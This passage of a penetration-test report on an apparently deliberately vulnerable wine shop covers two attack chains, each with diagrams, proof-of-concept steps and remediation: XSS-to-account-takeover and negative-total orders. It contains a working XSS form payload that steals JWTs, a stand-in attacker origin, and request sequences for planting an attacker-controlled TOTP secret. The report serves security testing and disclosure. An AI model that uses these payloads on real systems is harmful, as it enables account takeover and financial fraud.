         │                                 │  taintedport.com origin:
         │                                 │      t = localStorage.getItem('token')
         │                                 │      document.title = 'STOLE:'+t
         │                                 │
         │  [4] JWT exfiltrated ◄──────────┤ (in a real attack: fetch to
         │                                 │  attacker; here document.title)
         │                                 │
  ┌──────▼──────┐                          │                           │
  │ Attacker    │  [5] cross-origin API drive (Origin: attacker)       │
  │ holds JWT   │  ────────────────────────────────────────────────────►│
  │             │                                                       │
  │             │        ┌── vuln-0004 ── Access-Control-Allow-Origin: attacker
  │             │        │                 Access-Control-Allow-Credentials: true
  │             │  ◄─────┘                 (both mount points, incl. preflight)
  │             │
  │             │  [6] POST /auth/2fa/enable  Bearer JWT
  │             │      {totp_secret: ATTACKER, totp_code: TOTP(ATTACKER)}
  │             │  ────────────────────────────────────────────────────►│
  │             │        ┌── vuln-0013 ── stores attacker secret as canonical
  │             │  ◄─────┘                 totp_secret; totp_enabled=true
  │             │
  │             │  [7] PUT /auth/password  Bearer JWT
  │             │  ────────────────────────────────────────────────────►│
  │             │  ◄────── 200 password rotated
  │             │
  │             │  [8] GET /auth/me  Bearer <SAME PRE-ROTATION JWT>
  │             │  ────────────────────────────────────────────────────►│
  │             │        ┌── vuln-0018 ── no revocation on pw change;
  │             │        │                 no /auth/logout / session store
  │             │  ◄─────┘  200 — attacker STILL authenticates
  │             │
  │             │  [9] POST /auth/login {email, new_pw, totp: TOTP(ATTACKER)}
  │             │  ────────────────────────────────────────────────────►│
  │             │  ◄────── 200 with fresh 7-day JWT (parallel persistence)
  └─────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│ ROOT CAUSE                                                               │
│ Five independent defects compose: (1) reflection sink w/o encoding on    │
│ the origin that stores the JWT, (2) no CSP on that origin, (3) reflected │
│ Origin + Allow-Credentials on the API, (4) client is trusted to nominate │
│ the shared TOTP secret, (5) no server-side JWT revocation surface.       │
│ Fixing ANY ONE link breaks the chain; fixing all five removes the        │
│ constituent findings too.                                                │
├──────────────────────────────────────────────────────────────────────────┤
│ PREREQUISITES                                                            │
│  • Victim is logged in at the moment they visit the attacker page.       │
│  • Attacker controls one URL anywhere on the internet.                   │
│  • No prior privilege on the attacker's side.                            │
└──────────────────────────────────────────────────────────────────────────┘
```


#### Impact

Persistent, non-self-recoverable full account takeover of any TaintedPort user who is authenticated at the moment they visit an attacker-controlled URL. No prior privilege on the attacker's side; the only user interaction required is a single page visit.

The victim cannot regain access by any standard user-facing flow:

- The attacker has rotated the account password using the stolen JWT — the victim must run password recovery.
- The victim's authenticator app has no entry matching the account's TOTP secret (the attacker installed their own) — password recovery alone does not restore access.
- No self-service MFA-reset endpoint exists — operator intervention is required to eject the attacker.
- Meanwhile the attacker's original stolen JWT (7-day lifetime) is not invalidated by any credential rotation, and the attacker also holds a rolling FRESH JWT obtained by logging in with the rotated password + their own TOTP.

Population at risk: every registered user of the platform. If the victim is an administrator, the chain immediately yields administrative capability against the entire application (all admin endpoints authenticate on the same bearer JWT). Because sibling findings on this backend disclose `owner_password_hash` and `owner_totp_secret` on order records, a single successful chain execution can additionally exfiltrate the victim's bcrypt hash and any legitimate TOTP secret they had originally set.

Business consequences: unrecoverable customer account loss, mass PII exposure on admin-JWT theft, credential-hash leakage, and reputational damage disproportionate to the individual severity of any single link — the chain converts what would otherwise be a transient session hijack into an operator-only-recoverable compromise.

#### Technical Analysis

The chain's severity elevation comes from three compounding effects:

(a) Delivery becomes zero-click same-origin JS. The reflected-XSS sink in POST /api/contact/preview is unauthenticated, has no CSRF token, no `Sec-Fetch-Site` check, and accepts application/x-www-form-urlencoded — a CORS-simple content type. An ordinary cross-origin `<form>` therefore delivers arbitrary HTML to the target origin without a preflight; the browser follows the text/html response and executes the inline `<script>` on `taintedport.com`. The alternative XSS vectors (stored XSS in wine reviews, javascript: URI via login redirect) provide the same primitive with different UX. The absence of CSP on the origin is what actually permits the inline handler to run — remove it and every XSS bug in the codebase becomes at most an information leak.

(b) The JWT is same-origin script-readable and post-theft usable from anywhere. The SPA stores its 7-day HS256 JWT in localStorage.token. Once JS executes on `taintedport.com`, exfiltration is a single expression. The permissive CORS layer (arbitrary Origin reflected with ACAC=true, on both mount points, on preflight for state-changing endpoints too) means the attacker can then drive every authenticated endpoint from a hosted attacker page in the browser — the API sees the attacker origin and responds with ACAO reflected and ACAC=true. Verified in this validation on GET /auth/me with Origin: https://validator6.evil.test.

(c) Persistence is a multiplicative composition of two independent server-side defects. The /auth/2fa/enable endpoint reads the shared TOTP secret out of the request body rather than from a server-side pending value, and it does not re-verify the current password — so a stolen JWT is sufficient to install an MFA secret only the attacker knows. Independently, the JWT lifecycle has no server-side revocation primitive: no jti denylist, no per-user token-version claim, no session store, no /auth/logout. A JWT issued under vulnerable conditions is authoritative until natural exp regardless of any credential rotation the victim performs.

The composition of (b) and (c) is what pushes the chain from CVSS High to Critical: the raw XSS is transient (bounded by the 7-day JWT), but the 2FA backdoor lasts until an operator resets MFA, and the no-JWT-revocation defect ensures the attacker also retains their pre-rotation session in parallel with any freshly obtained one. Together they violate the fundamental account-recovery contract — the normal user-facing controls (password reset, email change) are insufficient to eject the attacker.

Verified concretely on user_id=530 (throwaway victim registered by the PoC):
  • Stolen JWT byte-identical to victim JWT (document.title == 'VAL6-STOLE:'+<JWT> after cross-origin form auto-submit).
  • Cross-origin GET /auth/me with Origin=https://validator6.evil.test → HTTP 200, ACAO reflected, ACAC=true.
  • POST /auth/2fa/enable with attacker-chosen base32 secret 44WS7IJBE4M25JMN6BCARY65NU and a matching TOTP → HTTP 200 "Two-factor authentication enabled successfully."; /auth/me reflects totp_enabled=true.
  • PUT /auth/password with stolen JWT → HTTP 200; ORIGINAL stolen JWT still returns HTTP 200 on subsequent /auth/me; POST /auth/logout, GET /auth/logout, DELETE /auth/session, POST /auth/signout all 404.
  • POST /auth/login {email, new_password} → requires_2fa=true; POST /auth/login {email, new_password, totp_code=<from attacker secret>} → HTTP 200 with a brand-new 7-day JWT.


#### Proof of Concept


Prerequisites: `playwright-cli` in PATH; Python `requests`. The PoC self-registers its own throwaway victim (`chval6-<epoch>-<hex>@example.com`) — no pre-existing account is touched.

    cd /workspace/validation/chains/reflected-xss-+-missing-csp-+-permissive
    python3 poc/poc.py --no-pause

Steps (all executed against the live target https://taintedport.com / https://api.taintedport.com):

Step 0 — Register throwaway victim via POST /auth/register; capture the returned JWT V.

Step 1 (browser) — Open a Playwright browser session `chain-validator-6`, goto https://taintedport.com/, seed `localStorage.token = V`. Then goto a `data:text/html;…` URL (opaque, definitively cross-origin) containing:

    <form action="https://taintedport.com/api/contact/preview" method="POST">
      <input name=name    value="A">
      <input name=email   value="a@b.co">
      <input name=subject value="S">
      <input name=message value='<script>document.title="VAL6-STOLE:"+localStorage.getItem("token");</script>'>
    </form>
    <script>document.getElementById('f').submit();</script>

Because the content-type is application/x-www-form-urlencoded, the cross-origin POST does not trigger a preflight; the browser follows the text/html response and executes the inline <script> on the taintedport.com origin. The stolen JWT lands in document.title; the PoC reads it back via `playwright-cli eval` and asserts byte-identity with V.

Step 2a — From Python, with Origin: https://validator6.evil.test, call GET /auth/me using the stolen JWT. Response HTTP 200 with the victim profile; response headers Access-Control-Allow-Origin: https://validator6.evil.test / Access-Control-Allow-Credentials: true. Proves the API is reachable and driveable from an attacker origin.

Step 2b — Generate a 16-byte random base32 TOTP secret client-side. Compute the current RFC 6238 code. POST /auth/2fa/enable with Authorization: Bearer <stolen> and body {"totp_secret":<attacker secret>, "totp_code":<code>} → HTTP 200 "Two-factor authentication enabled successfully.". Verify /auth/me now reports totp_enabled=true.

Step 2c — PUT /auth/password with the stolen JWT and {"current_password":<old>, "new_password":<attacker-chosen>} → HTTP 200.

Step 2d — GET /auth/me with the ORIGINAL stolen JWT (issued BEFORE the password change) → HTTP 200 with the user record. POST /auth/logout, GET /auth/logout, DELETE /auth/session, POST /auth/signout all HTTP 404.

Step 2e — POST /auth/login {email, new_password} → {"requires_2fa": true}. Then POST /auth/login {email, new_password, totp_code=<from attacker secret>} → HTTP 200 with a brand-new 7-day JWT. Persistence proven.

Machine-readable outcome saved to `poc/evidence/poc_result.json`; screenshot after XSS at `poc/evidence/01-after-xss.png`.



*The full exploit script is available in the annexes.*



#### Remediation

Any one of the fixes below breaks the chain; ship all of them to eliminate the individual weaknesses too.

1. HTML-encode reflection in POST /api/contact/preview. Apply `htmlspecialchars($v, ENT_QUOTES | ENT_HTML5, 'UTF-8')` to name/email/subject/message. Consider removing the endpoint entirely — the client-side "Confirm" button has no downstream send handler.
   • Equivalent break-any-link fixes for the alternative XSS vectors: render `review.comment` via React auto-escaping instead of `dangerouslySetInnerHTML` (breaks vuln-0015); reject non-relative or unsafe-scheme values on the login `redirect` parameter (breaks vuln-0006).

2. Deploy a strict Content-Security-Policy on taintedport.com (fastest path: Cloudflare Transform Rule). Minimum: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self' https://api.taintedport.com;`. This alone neutralises the inline `<script>` payload independently of any encoding bug.

3. Restrict CORS to a strict allow-list of first-party origins (e.g. `['https://taintedport.com']`). On mismatch emit no Access-Control-Allow-Origin at all. Never combine Access-Control-Allow-Credentials: true with a dynamically-reflected Origin. Explicitly reject Origin: null. Emit Vary: Origin.

4. Reject client-supplied `totp_secret` on POST /auth/2fa/enable. The server must be the sole authority on the shared secret. Introduce a `pending_totp_secret` column populated by POST /auth/2fa/setup, verify the submitted totp_code against that pending value on enable, and require the current password on enable (matching /auth/2fa/disable).

5. Introduce server-side JWT revocation. Add a per-user `token_version` counter to the users table, embed it as a `tv` claim on every JWT, and reject requests where `claim.tv != users.token_version`. Bump `token_version` on password change, email change, 2FA enable/disable, admin-forced signout, and an explicit POST /auth/logout endpoint. Additionally shorten the JWT lifetime from 7 days to something proportional to the sensitivity of the operations it permits (e.g. 15 minutes) with a rotating refresh token.

6. Stop storing the JWT in localStorage. Move it into an HttpOnly; Secure; SameSite=Strict cookie so same-origin JavaScript can no longer exfiltrate it even if a future XSS is introduced.

7. Add hardening headers on both hosts: Strict-Transport-Security, X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Referrer-Policy: no-referrer, Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=().

8. Add an out-of-band MFA-reset flow and email notifications whenever 2FA is enabled/disabled or the underlying secret rotates — so a victim can detect and reverse a backdoor via self-service rather than needing operator intervention.

9. Audit existing accounts with `totp_enabled=1` whose stored secret does not match any secret ever issued by /auth/2fa/setup — these are candidates for having been backdoored via the current flaw and should be reset out-of-band.

---


### chain-0003: Negative-Priced Catalog + Unbounded PUT /cart/update → Durable Negative-Total Order at Arbitrary Scale








**Severity:** HIGH | **CVSS:** 7.1 | **Endpoints:** `/auth/register`, `/wines`, `/cart/add`, `/cart/update`, `/cart`, `/orders`, `/orders/{id}` | **Method:** POST | **CWE:** CWE-840 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`

#### Chain Steps


1. **vuln-0019** — Amplification primitive — PUT /cart/update accepts any signed integer up to INT32_MAX with no bounds check, bypassing the 1..12 gate its sibling POST /cart/add correctly enforces. Alone this is cart-only I:L manipulation; in the chain it lifts the persisted negative-total ceiling from ~-1.2e5 EUR/line to ~-2.1e13 EUR/line.

2. **vuln-0010** — Durable-persistence primitive — POST /orders does not enforce total >= 0 on the server-computed order total, and the catalog seeds 8 negative-priced wines. Any cart with a negative total therefore becomes a durable `pending` order row. Alone the magnitude would be bounded by the 1..12 cap on POST /cart/add.


#### Description

Two independent business-logic weaknesses compose into a durable financial-integrity break on the TaintedPort API.

1. **vuln-0019 — Missing quantity validation on `PUT /cart/update`.** The sibling handler `POST /cart/add` correctly enforces `1 <= quantity <= 12` (HTTP 400 "Quantity must be between 1 and 12."). `PUT /cart/update` performs no equivalent check and accepts any signed integer up to `INT32_MAX (2 147 483 647)`. There is no DB `CHECK` on `cart_items.quantity`.
2. **vuln-0010 — `POST /orders` enforces no `total >= 0` invariant.** The endpoint correctly recomputes `total = Σ(price × quantity)` from server-side cart state and correctly ignores client-supplied `total`/`status`, but does not defensively assert `total >= 0` before inserting the `orders` row. There is no DB `CHECK` on `orders.total`. The wine catalog additionally seeds 8 items with `price < 0` (ids 3, 5, 6, 7, 8, 10, 11, 17; prices from −500 down to −9999) — a positive-priced wine with a negative PUT-update quantity would produce the same result even if these were removed.

Chained, any self-registered authenticated user can, in a ~5-request flow:
(a) legally add a negative-priced wine at `quantity=1` (passes the `1..12` gate on POST /cart/add),
(b) call `PUT /cart/update` with a much larger quantity — accepted verbatim,
(c) call `POST /orders` — the server persists a durable `pending`-status order whose `total` is a large negative number (per line bounded only by `INT32_MAX × min_price ≈ -2.1 × 10^13 EUR`).

The chain converts vuln-0019's I:L cart manipulation into I:H durable ledger corruption and lifts vuln-0010's per-line magnitude ceiling from `≈ -1.2 × 10^5 EUR` (the `qty ≤ 12` cap that applies to `POST /cart/add`) to `≈ -2.1 × 10^13 EUR`. Neither link is guarded at the DB layer, so fixing either alone still leaves the other exploitable.


#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  CHAIN: Negative-Priced Catalog + Unbounded PUT /cart/update                │
│         → Durable Negative-Total Order at Arbitrary Scale                   │
└─────────────────────────────────────────────────────────────────────────────┘

Prerequisites
  • Any self-registered authenticated user (PR:L, no admin, no MFA, no rate limit)
  • Wine catalog contains items with price < 0  (ids 3,5,6,7,8,10,11,17)
                 OR   PUT /cart/update accepts negative quantities on
                      positive-priced wines (equivalent chain)


  Attacker (any user)                          api.taintedport.com
  ─────────────────────                        ─────────────────────
                                                     │
   ┌─── PHASE 1: obtain a session ─────────────┐     │
   │                                            │     │
   │  POST /auth/register {email,pwd,name}     ─┼────►│
   │                                            │     │  201 + JWT
   │                                            │◄────┤
   └────────────────────────────────────────────┘     │
                                                     │
   ┌─── PHASE 2: recon negative-priced wines ──┐     │
   │                                            │     │
   │  GET /wines?limit=100                      ┼────►│
   │                                            │     │  wine_id=3   price=-999
   │                                            │◄────┤  wine_id=8   price=-9999
   │                                            │     │  … 8 items total
   └────────────────────────────────────────────┘     │
                                                     │
   ┌─── PHASE 3: prove POST /cart/add gate ────┐     │
   │           enforces 1..12 (control)         │     │
   │                                            │     │   ┌────────────────────┐
   │  POST /cart/add {wine_id:3, qty:13}       ─┼────►│───│ POST /cart/add     │
   │                                            │     │   │ qty in [1..12]?    │
   │                                            │     │   │ NO → HTTP 400      │
   │                                            │◄────┤   └────────────────────┘
   │      400  "Quantity must be between        │     │      invariant lives HERE
   │           1 and 12."                       │     │
   └────────────────────────────────────────────┘     │
                                                     │
   ┌─── PHASE 4: seed a legal 1-unit line ─────┐     │
   │                                            │     │
   │  POST /cart/add {wine_id:3, qty:1}        ─┼────►│  200
   │                                            │◄────┤
   └────────────────────────────────────────────┘     │
                                                     │
   ┌─── PHASE 5: CHAIN LINK A — vuln-0019 ─────┐     │
   │  bypass the 1..12 gate on PUT             │     │   ┌─── GAP #1 ─────────┐
   │                                            │     │   │ PUT /cart/update   │
   │  PUT /cart/update {wine_id:3, qty:17}     ─┼────►│───│ NO qty validation  │
   │      (or qty:2147483647)                   │     │   │ stores VERBATIM    │
   │                                            │◄────┤   └────────────────────┘
   │      200  "Cart updated"                   │     │        └──► cart_items.quantity = 17
   │                                            │     │             (no DB CHECK)
   │  GET /cart                                 ┼────►│
   │                                            │◄────┤   items:[{price:-999,
   │      total = -16 983  (server-computed)    │     │            qty:17,
   │                                            │     │            subtotal:-16983}]
   └────────────────────────────────────────────┘     │   total  = -16 983  ← attacker-chosen
                     │                               │
                     │  cart is now in an            │
                     │  invalid state — but the      │
                     │  API happily accepts it       │
                     ▼                               │
                                                     │
   ┌─── PHASE 6: CHAIN LINK B — vuln-0010 ─────┐     │
   │  persist the negative total durably       │     │   ┌─── GAP #2 ─────────┐
   │                                            │     │   │ POST /orders       │
   │  POST /orders                             ─┼────►│───│ recomputes total   │
   │    { shipping_address:{...},               │     │   │  from cart ✓       │
   │      delivery_notes:"..."   }              │     │   │ ignores client     │
   │                                            │     │   │  total/status ✓    │
   │                                            │     │   │ asserts total>=0?  │
   │                                            │     │   │  NO → INSERT       │
   │                                            │◄────┤   └────────────────────┘
   │      201 { order_id: 155 }                 │     │        └──► orders row:
   │                                            │     │             total=-16983
   │  GET /orders/155                          ─┼────►│             status='pending'
   │                                            │◄────┤             (no DB CHECK)
   │      { id:155,                             │     │
   │        total:-16983,                       │     │
   │        status:'pending',      ← DURABLE    │     │
   │        user_id:520, ... }                  │     │
   └────────────────────────────────────────────┘     │
                                                     │
   ┌─── PHASE 7 (safe demo): amplification ────┐     │
   │              at cart layer only            │     │
   │                                            │     │
   │  POST /cart/add {wine_id:8, qty:1}        ─┼────►│  200
   │  PUT /cart/update {wine_id:8,             ─┼────►│  200
   │       qty:2147483647}                      │     │
   │  GET /cart                                ─┼────►│
   │                                            │◄────┤  total = -21,472,688,986,353
   │      ~ -21.5 TRILLION EUR                  │     │        (~-2.1 × 10¹³)
   │      (POST /orders NOT called; cart        │     │
   │       cleared with DELETE /cart/remove/8)  │     │
   └────────────────────────────────────────────┘     │

Downstream impact (cash-on-delivery model)
──────────────────────────────────────────
  Order 155 enters the normal fulfilment queue in `pending` status.
  Merchant ledger shows a debt of |total| owed BY the merchant TO the buyer.
  No admin review branch, no "negative total" alert — indistinguishable from
  a legitimate order to reporting / accounting / partner-settlement flows.
  Fixed-width column overflow becomes plausible at 10¹³-scale magnitudes
  (basis for A:L uplift over the constituent findings).

Root cause
──────────
  Two independent domain invariants —
    (a) cart_items.quantity ∈ [1..12]
    (b) orders.total >= 0
  — are enforced ONLY at handler entry, ONLY in one of two mutation paths for
  (a), and NOT AT ALL for (b). No DB CHECK constraints backstop either.
  Fixing either link in isolation still leaves the other exploitable.

Fix graph
─────────
       break-link-A                   break-link-B
     ─────────────────             ─────────────────
      validate qty on               assert total>=0
      PUT /cart/update              in POST /orders
             │                             │
             └──────────┬──────────────────┘
                        ▼
             Both handlers call a shared
             validate_*() helper backed by
             CHECK constraints on
             cart_items.quantity + orders.total
                        +
             Catalog sanitation: no wine row with price<0.
```


#### Impact

Any authenticated user (self-registration open, no admin, no MFA, no rate limit) can create durable `orders.pending` rows with attacker-chosen negative totals of arbitrary magnitude, on a cash-on-delivery merchant with no payment authorization step.

Directly proven this validation:
- Order id 155 persisted with `total = -16 983 EUR, status = pending` (curl reproduction under self-registered user 520).
- Order id 156 (poc.py) and 157 (verify.py) persisted with `total = -15 096 EUR, status = pending` under separate throwaway users.
- Amplified cart-layer proof: `wine_id=8 (price=-9999)` × `qty=2 147 483 647` yields a server-computed `subtotal = -21 472 688 986 353 EUR` (~-21.5 trillion). This is the value the identical `POST /orders` code path that persisted 155/156/157 would persist unmodified — deliberately not called to avoid a fraudulent-scale artifact.

Business consequences in the cash-on-delivery model:
- Each such order enters the normal fulfillment queue in `pending` status. The merchant's ledger indicates it owes `|total|` to the buyer on delivery.
- The row is indistinguishable to downstream fulfillment / accounting / reporting from a legitimate one; there is no "negative total" branch, alert, or admin-review gate.
- Downstream fixed-width integer columns, tax engines, partner settlement, or reporting pipelines can plausibly overflow or fail on ~10^13-scale values (basis for the A:L uplift over the constituent findings).

Amplification vs. each finding in isolation:
- vuln-0019 alone: I:L, cart-only manipulation; no durable damage in a positive-price catalog.
- vuln-0010 alone with the `1..12` cap on POST /cart/add: durable, but per-line bounded to ≈ -1.2 × 10^5 EUR.
- Chained: durable AND per-line bounded only by `INT32_MAX × min_price ≈ -2.1 × 10^13 EUR`.

No privilege escalation, no opaque identifiers, and no victim required — fully self-serve for any registered user.

#### Technical Analysis

Both links are independent, each on its own request path, and neither is backed by a DB CHECK constraint. Fixing one alone still leaves the chain broken through the other.

Link 1 — vuln-0019 (PUT /cart/update input validation gap)
- `POST /cart/add` — verified this session — enforces `1 <= quantity <= 12` and returns `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}` for any value outside that range.
- `PUT /cart/update` — verified this session — accepted `qty=17` and `qty=2147483647` for the same authenticated session on the same wine_id with `HTTP 200 {"success":true,"message":"Cart updated"}`. No DB `CHECK` on `cart_items.quantity` backstops the missing check.
- Root cause is per-handler validation: the invariant lives in one handler instead of a domain-model `Cart::updateQuantity(qty)` helper or a DB CHECK.

Link 2 — vuln-0010 (missing total>=0 invariant at POST /orders)
- `POST /orders` correctly recomputes `total = Σ item.price × item.quantity` from the server-side cart and correctly ignores client-supplied `total`/`status` fields (this is NOT a mass-assignment finding — verified by the chain-tester's original run and consistent with what we observed here).
- However, no `total >= 0` assertion is made before the INSERT. Any negative subtotal reachable via any cart-mutation path therefore becomes a durable `orders` row in `pending` status.
- Auxiliary condition: the catalog contains 8 wines with `price < 0` at the time of testing. Even if those were removed, `PUT /cart/update` with a negative quantity on a positive-priced wine would produce the same negative subtotal — so the chain does not fundamentally depend on the negative-priced seed data.

Chain composition (verified end-to-end, single session, ~5 requests):
1. `POST /cart/add {wine_id: 3, qty: 1}` — legal 1-unit line seeded (passes 1..12 gate).
2. `PUT /cart/update {wine_id: 3, qty: 17}` — accepted (vuln-0019). Row stored verbatim.
3. `GET /cart` — server-computed `total = -16 983 EUR` (price -999 × qty 17).
4. `POST /orders {shipping_address, delivery_notes}` — HTTP 201, `order_id: 155` (vuln-0010).
5. `GET /orders/155` — durable row `{total: -16 983, status: "pending"}`.

Amplification proven at cart layer only (no fraudulent-scale order placed):
- Same flow with `wine_id=8, qty=INT32_MAX` yields `subtotal = -21 472 688 986 353 EUR` on GET /cart. The identical POST /orders code path that persisted 155 would persist this value with no additional checks.

Severity elevation reasoning:
- vuln-0019 alone: I:L (cart-only). Base 4.3.
- vuln-0010 alone with the POST /cart/add cap applying to every mutation path: I:H but per-line bounded to ≈ -1.2 × 10^5 EUR. Base 6.5.
- Chained: retains I:H (durable financial-data corruption at attacker-chosen magnitude) and adds A:L for the credible downstream overflow / reporting-DoS risk at ~10^13 magnitudes. Base 6.8.

Root cause is architectural: the domain invariants ("cart line quantity in 1..12", "order total >= 0") are enforced at handler entry points, and inconsistently. Correct remediation is central helpers + database CHECK constraints on both `cart_items.quantity` and `orders.total`, plus catalog sanitation.


#### Proof of Concept


Prerequisites: any authenticated user (self-registration is open and requires no email verification). No admin, no MFA, no opaque identifiers.

Reproduction (~5 requests):

1. `POST /auth/register {email, password, name}` → HTTP 201 + JWT. (Or `POST /auth/login` with existing credentials.)
2. `GET /wines?limit=100` — confirm the catalog still has wines with `price < 0`. Observed: ids 3(-999), 5(-5000), 6(-500), 7(-5000), 8(-9999), 10(-500), 11(-888), 17(-7777).
3. Control sample — `POST /cart/add {wine_id: 3, quantity: 13}` → HTTP 400 "Quantity must be between 1 and 12." (proves the invariant EXISTS on POST /cart/add).
4. `POST /cart/add {wine_id: 3, quantity: 1}` → HTTP 200 (legal line seeded).
5. **Chain link A (vuln-0019)** — `PUT /cart/update {wine_id: 3, quantity: 17}` → HTTP 200 `{"success":true,"message":"Cart updated"}`. No bound enforced.
6. `GET /cart` → `{items:[{wine_id:3, price:-999, quantity:17, subtotal:-16983}], total:-16983}`.
7. **Chain link B (vuln-0010)** — `POST /orders {shipping_address:{name, street, city, postal_code, phone}, delivery_notes}` → HTTP 201 `{"success":true,"order_id":155}`.
8. `GET /orders/155` → durable `{id:155, total:-16983, status:"pending", user_id:520, …}`. Persistence confirmed.

Amplification (cart-level only — do NOT persist a fraudulent-scale order):
9. `POST /cart/add {wine_id: 8, quantity: 1}` (fresh line for a wine with a more negative price).
10. `PUT /cart/update {wine_id: 8, quantity: 2147483647}` → HTTP 200.
11. `GET /cart` → `total = -21 472 688 986 353` (~-21.5 trillion EUR). Same POST /orders code path that persisted 155 would persist this value unmodified. Do NOT POST /orders.
12. `DELETE /cart/remove/8` — clear the amplified cart.

Live evidence recorded (throwaway users cv2-1784551269@example.com [uid 520] and cv-chain-1784551384@example.com):
- Order id 155 — total -16 983 (curl reproduction).
- Order id 156 — total -15 096 (poc.py reproduction).
- Order id 157 — total -15 096 (verify.py reproduction).

The `poc.py` script prints a step-by-step verdict; `verify.py` returns exit 0 with a `[VULNERABLE]` line when the chain still works and exit 1 with `[NOT VULNERABLE]` when either link has been fixed.



*The full exploit script is available in the annexes.*



#### Remediation

Break the chain by fixing EITHER link — but the correct defence-in-depth approach fixes both plus the underlying architecture.

1. **Break link A (vuln-0019) — validate quantity on PUT /cart/update.** Apply the same `1 <= quantity <= 12` check that `POST /cart/add` uses. Reject non-positive and out-of-range integers with `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}`. Extract the check into a shared `validate_cart_quantity(qty)` helper called from every cart-mutation handler (current, future, bulk, admin).

2. **Break link B (vuln-0010) — enforce total >= 0 in POST /orders.** Immediately after computing `total = Σ(item.price × item.quantity)` and before inserting the `orders` row, assert `total >= 0` (and reject any per-line `subtotal < 0`). Return HTTP 400 with a clear error otherwise.

3. **Database-layer backstop.** Add `CHECK (quantity BETWEEN 1 AND 12)` on `cart_items.quantity` (and `order_items.quantity`), and `CHECK (total >= 0)` on `orders.total`. These invariants must hold regardless of application code.

4. **Sanitise the catalog.** No active wine row should have `price < 0`. Delete the offending seed rows (ids 3, 5, 6, 7, 8, 10, 11, 17 at time of testing), set them `is_active = false`, or scope every "wine addable to cart" query with `WHERE price > 0`.

5. **Detective control.** Alert on any INSERT to `orders` where `total <= 0` or any INSERT/UPDATE on `cart_items` where `quantity NOT BETWEEN 1 AND 12`. Surface both to security monitoring and to the fraud-review team.

6. **Regression tests.** For every cart-mutation handler (add/update/bulk), run the same invalid-quantity matrix (`-1`, `0`, `13`, `999`, `2147483647`) and assert HTTP 400. For `POST /orders`, seed a cart with a negative-priced wine (or a negative-quantity line) and assert HTTP 400.

7. **Domain refactor (root cause).** Move quantity and total invariants out of handlers into the `Cart` and `Order` domain models (e.g. `Cart::updateQuantity(qty)` raising `InvalidArgumentException`, `Order::fromCart(cart)` refusing to construct when `total < 0`). Handlers should call the model, not re-implement checks.

Fixing (1) alone drops the amplification ceiling but still allows -1.2×10⁵-EUR/line durable losses via POST /cart/add. Fixing (2) alone eliminates the persistent damage but leaves runtime cart-level manipulation and any downstream systems that read the cart directly. Both are necessary for a proper fix.

---




## Recommendations

## Priority 0 — Immediate (act within 24–72 hours)

These items close the primitives that grant unauthenticated administrative capability or unauthenticated exfiltration of the full credential ledger. Any of them alone is a full-compromise risk on the live target today.

1. **Enable HS256 signature verification in the API authentication middleware and rotate the JWT signing secret.** Reject tokens whose `alg` header is `none`, whose signature does not verify, or whose algorithm differs from the server-configured one. Because the signing secret was disclosed via LFI during testing, rotation is required — verification alone is insufficient.
2. **Take `GET /openapi.yaml` offline** on both `taintedport.com/api/openapi.yaml` and `api.taintedport.com/openapi.yaml`. If a developer schema must be published, publish a sanitized variant that does not contain credentials in `info.description` and does not document non-public endpoints.
3. **Remove or fully lock down `POST /wines/import-url`.** If removal is not possible, apply a scheme allow-list (`https:` only), a host allow-list (no RFC 1918, no `127.0.0.0/8`, no `169.254.0.0/16`, no `::1`, no `fc00::/7`, no `fe80::/10`), and reject redirects to any of the above.
4. **Restrict `GET /orders/{id}`** to callers whose JWT `user_id` matches the order's owner or whose JWT `is_admin` is authoritatively true. Strip the `owner_password_hash`, `owner_totp_secret`, `owner_email`, and `owner_is_admin` fields from every response body of every order endpoint — they should never leave the database layer.
5. **Force-invalidate all outstanding JWTs.** Rotating the signing secret in step 1 accomplishes this. Communicate re-login guidance to legitimate users out of band.
6. **Reset MFA enrolment for every account with `totp_enabled=true`** and rotate every password. Because the credential ledger is assumed to have leaked and 2FA secrets could have been backdoored, every previously logged-in account must be treated as compromised.
7. **Rotate the `admin@taintedport.com` password** (currently `admin`) and disable that account if it is not needed. Audit login history for that account against the last 90 days.
8. **Fix mass assignment on `POST /auth/register` and `PUT /auth/profile`.** Bind only `{name, email, password}` on register and only `{name}` on profile-update. Ignore any other body field silently. Apply the same allow-list discipline to `PUT /orders/{id}/status` — ignore any body field other than the exact status transition being performed and drive authorization from the JWT claim, not from a body field.
9. **Parameterise the `email` argument** in the `POST /auth/login` query path (and audit all `POST /auth/login`, `GET /wines`, `GET /wines/{id}` DB call sites) — use prepared statements exclusively.

## Priority 1 — Short term (2–4 weeks)

10. **Server-side session revocation.** Introduce a per-user `token_version` (or a token `jti` denylist) so that a password change, email change, or MFA enrolment change invalidates all previously-issued JWTs for the affected account. Verify at auth middleware entry.
11. **Move the JWT out of `localStorage`.** Serve it as an `HttpOnly; Secure; SameSite=Strict` cookie or, at minimum, deploy a strict Content Security Policy without `unsafe-inline`, without `unsafe-eval`, and with an explicit `script-src 'self'`. Set a `default-src 'self'` fallback. Both together are preferred.
12. **Fix `POST /auth/2fa/enable` to ignore the client-supplied `totp_secret` field.** The server must remember the pending secret issued by `POST /auth/2fa/setup` for the caller's account and only accept a code that verifies against that specific server-side secret. Refuse `enable` if there is no pending setup or if the pending secret is stale.
13. **Add a `total >= 0` invariant** at `POST /orders`, and a `quantity BETWEEN 1 AND 12` invariant at both `POST /cart/add` and `PUT /cart/update` (at the endpoint and, defensively, as a database CHECK constraint). Reject any wine with a negative unit price at cart-add time — negative-priced catalog rows should not exist.
14. **HTML-encode all reflected user input** in `POST /api/contact/preview` and any other server-rendered echo path. Use context-aware encoding (HTML body, HTML attribute, JavaScript, URL) and choose the encoder at the sink site.
15. **HTML-encode all persisted user input** at render time on wine-review comment display. Alternatively, allow-list a small Markdown subset and render through a well-known sanitiser.
16. **Deploy CORS policy correctly.** Replace the current "reflect any origin" behaviour with an explicit allow-list of origins that need cross-origin access (frontend host only, if any). Only send `Access-Control-Allow-Credentials: true` for those origins.
